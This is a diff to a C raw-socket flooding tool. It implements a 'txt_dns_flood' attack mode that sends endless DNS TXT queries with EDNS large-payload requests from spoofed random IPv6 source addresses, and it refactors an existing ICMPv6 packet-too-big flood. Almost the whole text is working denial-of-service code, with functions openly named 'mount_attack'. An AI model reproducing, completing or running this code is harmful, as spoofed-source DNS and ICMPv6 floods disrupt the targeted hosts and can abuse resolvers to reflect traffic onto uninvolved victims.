@@ -13,6 +13,7 @@
 #include <sys/types.h>
 #include <netinet/ip6.h>
 #include <netinet/icmp6.h>
+#include <netinet/udp.h>
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <time.h>
@@ -37,6 +38,12 @@ struct {
 	struct {
 		rnd_well512_t well512;
 	} rnd;
+	struct {
+		struct {
+			uint8_t m[256];
+			size_t len;
+		} rname;
+	} txt;
 } gctx;
 
 struct {
@@ -58,6 +65,7 @@ struct {
 	} flags;
 	int v;
 	const char *mode;
+	const char *txt;
 } param;
 
 static void init_global (void) {
@@ -103,16 +111,17 @@ static void genrnd (const size_t len, void *out) {
 static void print_help (FILE *f) {
 	fprintf(f,
 "Usage: %s [-hdq] [--help] [--dryrun] [--quiet] <-m MODE>|<--mode MODE>"
-"       [--] SRC_NET DST_ADDR\n"
+"       [-T TXT]|[--txt TXT] [--] SRC_NET DST_ADDR\n"
 "MODE:        'ptb_flood_icmp6_echo' | 'txt_dns_flood'\n"
 "SRC_NET:     2001:db8:1:2::/64\n"
 "DST_ADDR:    any string accepted by getaddrinfo()\n"
 "Options:\n"
-"  -m, --mode     MODE  run in specified mode\n"
-"  -d, --dryrun   run in dry mode (don't actually send anything)\n"
-"  -v, --verbose  increase verbosity\n"
-"  -q, --quiet    report errors only\n"
-"  -h, --help     print this message and exit normally\n"
+"  -m, --mode MODE  run in specified mode\n"
+"  -T, --txt TXT    TXT rname to use in query\n"
+"  -d, --dryrun     run in dry mode (don't actually send anything)\n"
+"  -v, --verbose    increase verbosity\n"
+"  -q, --quiet      report errors only\n"
+"  -h, --help       print this message and exit normally\n"
 		,
 		ARGV0);
 };
@@ -256,16 +265,15 @@ static void do_report (const size_t cur_it) {
 	gctx.bm.last_it_cnt = cur_it;
 }
 
-static void mount_attack_icmp6_ptb(void) {
-	static struct {
+static void mount_attack_icmp6_ptb (void) {
+	struct {
 		struct ip6_hdr ih6;
 		struct icmp6_hdr icmp6;
 		struct {
 			struct ip6_hdr ih6;
 			struct icmp6_hdr icmp6;
 		} body;
-	} snd_buf;
-	static struct sockaddr_in6 sa;
+	} snd_buf = { 0, };
 	ssize_t fr;
 
 	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
@@ -282,13 +290,7 @@ static void mount_attack_icmp6_ptb(void) {
 	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(sizeof(struct icmp6_hdr));
 	memcpy(&snd_buf.body.ih6.ip6_src, &snd_buf.ih6.ip6_dst, 16);
 	snd_buf.body.icmp6.icmp6_type = ICMP6_ECHO_REPLY;
-	snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8[0] = 0xde;
-	snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8[1] = 0xad;
-	snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8[2] = 0xbe;
-	snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8[3] = 0xef;
-
-	sa.sin6_family = AF_INET6;
-	memcpy(&sa.sin6_addr, &snd_buf.ih6.ip6_dst, 16);
+	genrnd(sizeof(uint32_t), snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8);
 
 	for (size_t it = 0; ; it += 1) {
 		genrnd_src_addr(&snd_buf.ih6.ip6_src);
@@ -318,7 +320,7 @@ static void mount_attack_icmp6_ptb(void) {
 			&snd_buf,
 			sizeof(snd_buf),
 			MSG_NOSIGNAL,
-			(const struct sockaddr*)&sa,
+			(const struct sockaddr*)&param.dst.sa,
 			sizeof(struct sockaddr_in6));
 
 		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
@@ -337,10 +339,154 @@ static int main_ptb_flood_icmp6_echo (void) {
 	return 0;
 }
 
+static void foreach_label (
+		const char *in_rname,
+		void *uc,
+		bool(*cb)(char *label, uint8_t len, void *uc))
+{
+	char rname[256];
+	char *p, *dot;
+	uint8_t len;
+
+	p = rname;
+	strncpy(rname, in_rname, sizeof(rname) - 1);
+
+	do {
+		dot = strchr(p, '.');
+
+		if (dot != NULL) {
+			*dot = 0;
+		}
+		len = (uint8_t)strlen(p);
+		if (len > 0) {
+			if (!cb(p, len, uc)) {
+				return;
+			}
+		}
+		p = dot + 1;
+	} while (dot != NULL);
+
+	cb(NULL, 0, uc);
+}
+
+static bool label_rname (char *label, uint8_t len, void *) {
+	assert(gctx.txt.rname.len + len < sizeof(gctx.txt.rname));
+
+	gctx.txt.rname.m[gctx.txt.rname.len] = len;
+	memcpy(gctx.txt.rname.m + 1 + gctx.txt.rname.len, label, len);
+	gctx.txt.rname.len += (size_t)len + 1;
+
+	return true;
+}
+
+void mount_attack_dns_txt_flood (void) {
+	struct {
+		struct ip6_hdr ih6;
+		struct udphdr udp;
+		uint8_t data[512];
+	} snd_buf = { 0, };
+	ssize_t fr;
+	const uint16_t data_len = (uint16_t)gctx.txt.rname.len + 27;
+
+	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
+	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
+	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
+	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_UDP;
+	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(
+		(uint16_t)sizeof(struct udphdr) +
+		data_len
+	);
+	snd_buf.udp.uh_dport = param.dst.sa.sin6_port = htons(53);
+	snd_buf.udp.uh_ulen = htons((uint16_t)sizeof(struct udphdr) + data_len);
+
+	// QR: 0, Opcode: 0, AA:0, TC: 0, RD: 1, RA: 0, Z: 0, RCODE: 0
+	snd_buf.data[2] = 0x01;
+	snd_buf.data[3] = 0x00;
+	// QDCOUNT: 1
+	snd_buf.data[4] = 0x00;
+	snd_buf.data[5] = 0x01;
+	// ANCOUNT, NSCOUNT
+	snd_buf.data[6] = snd_buf.data[7] = snd_buf.data[8] = snd_buf.data[9] = 0x00;
+	// ARCOUNT: 1
+	snd_buf.data[10] = 0x00;
+	snd_buf.data[11] = 0x01;
+	// QNAME
+	memcpy(snd_buf.data + 12, gctx.txt.rname.m, gctx.txt.rname.len);
+	// QTYPE: TXT
+	snd_buf.data[gctx.txt.rname.len + 12] = 0x00;
+	snd_buf.data[gctx.txt.rname.len + 13] = 0x10;
+	// QCLASS: IN
+	snd_buf.data[gctx.txt.rname.len + 14] = 0x00;
+	snd_buf.data[gctx.txt.rname.len + 15] = 0x01;
+
+	// NAME: ROOT
+	snd_buf.data[gctx.txt.rname.len + 16] = 0x00;
+	// OPT
+	snd_buf.data[gctx.txt.rname.len + 17] = 0x00;
+	snd_buf.data[gctx.txt.rname.len + 18] = 0x29;
+	// UDP payload size: 1298
+	snd_buf.data[gctx.txt.rname.len + 19] = 0x05;
+	snd_buf.data[gctx.txt.rname.len + 20] = 0x12;
+
+	snd_buf.data[gctx.txt.rname.len + 21] = 0x00;
+	snd_buf.data[gctx.txt.rname.len + 22] = 0x00;
+
+	snd_buf.data[gctx.txt.rname.len + 23] = 0x00;
+	snd_buf.data[gctx.txt.rname.len + 24] = 0x00;
+	// Data length: 0
+	snd_buf.data[gctx.txt.rname.len + 25] = 0x00;
+	snd_buf.data[gctx.txt.rname.len + 26] = 0x00;
+
+	for (size_t it = 0; ; it += 1) {
+		genrnd_src_addr(&snd_buf.ih6.ip6_src);
+
+		// ID
+		genrnd(2, snd_buf.data);
+		snd_buf.data[1] |= 1; // as 0 is reserved
+
+		genrnd(2, &snd_buf.udp.uh_sport);
+		snd_buf.udp.uh_sport = htons((snd_buf.udp.uh_sport % 59975) + 1025);
+		snd_buf.udp.uh_sum = 0;
+		snd_buf.udp.uh_sum = htons(calc_chksum6(
+			&snd_buf.ih6,
+			(const uint8_t*)&snd_buf.udp,
+			sizeof(snd_buf.udp),
+			snd_buf.data,
+			data_len
+		));
+
+		errno = 0;
+		fr = param.flags.dryrun ? 0 : sendto(
+			gctx.fd.sck,
+			&snd_buf,
+			sizeof(struct ip6_hdr) + sizeof(struct udphdr) + data_len,
+			MSG_NOSIGNAL,
+			(const struct sockaddr*)&param.dst.sa,
+			sizeof(struct sockaddr_in6));
+
+		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
+			report_sent(&snd_buf.ih6.ip6_src, errno);
+		}
+		if (!param.flags.quiet) {
+			do_report(it);
+		}
+	}
+}
+
+static void init_dns_txt_labels (void) {
+	gctx.txt.rname.len = 0;
+	foreach_label(param.txt, NULL, label_rname);
+	assert(gctx.txt.rname.len < sizeof(gctx.txt.rname.m));
+}
+
 static int main_txt_dns_flood (void) {
 	// TODO: parallelise?
+	init_dns_txt_labels();
+
 	seedrnd();
-	// TODO
+
+	mount_attack_dns_txt_flood();
+
 	return 0;
 }
 
@@ -372,7 +518,7 @@ static bool parse_net_str (
 	int fr;
 
 	strncpy(str, in_str, sizeof(str) - 1);
-	slash = strstr(str, "/");
+	slash = strchr(str, '/');
 	if (slash != NULL) {
 		*slash = 0;
 
@@ -408,13 +554,14 @@ static bool parse_param (const int argc, const char **argv) {
 		{ "quiet",   false, NULL, 'q' },
 		{ "mode",    true,  NULL, 'm' },
 		{ "verbose", false, NULL, 'v' },
+		{ "txt",     true,  NULL, 'T' },
 	};
 	int loi = -1;
 	int fr;
 	bool fallthrough = false;
 
 	while (true) {
-		fr = getopt_long(argc, (char *const*)argv, "hdqm:v", LOPTS, &loi);
+		fr = getopt_long(argc, (char *const*)argv, "hdqm:vT:", LOPTS, &loi);
 		if (fr < 0) {
 			break;
 		}
@@ -425,6 +572,7 @@ static bool parse_param (const int argc, const char **argv) {
 		case 'q': param.flags.quiet = true; break;
 		case 'm': param.mode = optarg; break;
 		case 'v': param.v += 1; break;
+		case 'T': param.txt = optarg; break;
 		default: return false;
 		}
 	}
@@ -532,6 +680,12 @@ int main (const int argc, const char **argv) {
 		ec = main_ptb_flood_icmp6_echo();
 	}
 	else if (strcmp(param.mode, "txt_dns_flood") == 0) {
+		if (param.txt == NULL) {
+			fprintf(stderr, ARGV0": missing option -T\n");
+			ec = 2;
+			goto END;
+		}
+
 		ec = main_txt_dns_flood();
 	}
 	else {
